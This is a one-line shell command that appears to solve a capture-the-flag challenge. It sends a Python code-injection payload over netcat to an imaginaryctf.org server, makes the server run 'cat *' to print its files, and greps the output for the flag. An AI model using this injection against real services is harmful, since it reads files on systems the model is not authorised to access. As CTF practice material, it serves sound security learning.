echo '__import__("os").system("cat *")' | nc stephencurry.imaginaryctf.org 5005 | grep -o 'ictf.*'
